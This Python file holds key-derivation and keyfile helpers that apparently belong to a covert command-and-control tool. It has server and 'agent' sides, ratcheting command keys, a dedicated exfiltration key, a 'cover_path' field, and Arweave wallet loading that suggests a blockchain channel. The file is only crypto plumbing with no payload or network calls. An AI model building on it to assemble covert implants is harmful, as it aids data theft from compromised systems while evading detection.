import os
import hashlib
import hmac
import json
import arweave

#Shared functions

#Advanced ratchet mechanism
def advance_ratchet(k_ratchet):
    return hmac.new(k_ratchet, b"RATCHET", hashlib.sha256).digest()

#Derives our per task keys
def derive_cmd_key(k_ratchet, salt):
    return hmac.new(k_ratchet, salt + b"CMDKEY", hashlib.sha256).digest()


#Server side functions

def server_generate_k_root():
    K_root = os.urandom(32)
    return K_root

def server_derive_allkeys(K_root):
    server_keys = {}

    #Derives K_ratchet
    K_ratchet = hmac.new(K_root, b"RATCHET_INIT", hashlib.sha256).digest()
    server_keys["K_ratchet"] = K_ratchet

    #Derives K_exfil_ratchet
    K_exfil_ratchet  = hmac.new(K_root, b"EXFIL_RATCHET_INIT", hashlib.sha256).digest()
    server_keys["K_exfil_ratchet"] = K_exfil_ratchet

    #Derives K_extract
    K_extract = hmac.new(K_root, b"EXTRACT", hashlib.sha256).digest()
    server_keys["K_extract"] = K_extract

    return server_keys

#Saves K_root to keyfile.
def server_save_server_keys(keyfile_path, k_root):
    server_keys = {"K_root": k_root.hex()}

    with open(keyfile_path, "w") as f:
        json.dump(server_keys, f)

#Loads K_root from keyfile
def server_load_server_keys(keyfile_path):
    #Opens keyfile
    try: 
        with open(keyfile_path, "r") as f:
            data = json.load(f)
            return bytes.fromhex(data["K_root"])
    #If keyfile doesnt exist
    except FileNotFoundError:
        server_key = server_generate_k_root()
        server_save_server_keys(keyfile_path, server_key)
        return server_key


#Agent side functions

#saves agent keys to keyfile
def agent_save_agent_keys(keyfile_path, K_ratchet, K_exfil_ratchet, K_extract,
                           server_wallet=None, last_seen_txid=None, cover_path=None):
    #Load existing keyfile to preserve fields not passed in
    existing = {}
    if os.path.exists(keyfile_path):
        try:
            with open(keyfile_path, "r") as f:
                existing = json.load(f)
        except (json.JSONDecodeError, OSError):
            existing = {}

    #Saves agent keys to temp dict
    agent_keys = {
        "K_ratchet": K_ratchet.hex(),
        "K_exfil_ratchet": K_exfil_ratchet.hex(),
        "K_extract": K_extract.hex(),
        "server_wallet": existing.get("server_wallet", ""),
        "last_seen_txid": existing.get("last_seen_txid", ""),
        "cover_path": existing.get("cover_path", ""),
    }

    #Override with explicitly-provided runtime/provisioning values
    if server_wallet is not None:
        agent_keys["server_wallet"] = server_wallet
    if last_seen_txid is not None:
        agent_keys["last_seen_txid"] = last_seen_txid
    if cover_path is not None:
        agent_keys["cover_path"] = cover_path

    #saves agent keys to keyfile
    with open(keyfile_path, "w") as f:
        json.dump(agent_keys, f)

#Loads agent keys from keyfiles
def agent_load_agent_keys(keyfile_path):
    #Tries to open keyfile
    try: 
        with open(keyfile_path, "r") as f:
            data = json.load(f)
            K_ratchet = bytes.fromhex(data["K_ratchet"])
            K_exfil_ratchet = bytes.fromhex(data["K_exfil_ratchet"])
            K_extract = bytes.fromhex(data["K_extract"])
            server_wallet = data.get("server_wallet", "")
            last_seen_txid = data.get("last_seen_txid", "")
            cover_path = data.get("cover_path", "")
    #if keyfile isnt found
    except FileNotFoundError:
        raise FileNotFoundError("Keyfile Not Found")
    
    #Returns agent keys
    agent_keys = {
        "K_ratchet": K_ratchet,
        "K_exfil_ratchet": K_exfil_ratchet,
        "K_extract": K_extract,
        "server_wallet": server_wallet,
        "last_seen_txid": last_seen_txid,
        "cover_path": cover_path,
    }

    return agent_keys


#Wallet functions

def load_wallet(keyfile_path):
     return arweave.Wallet(keyfile_path)




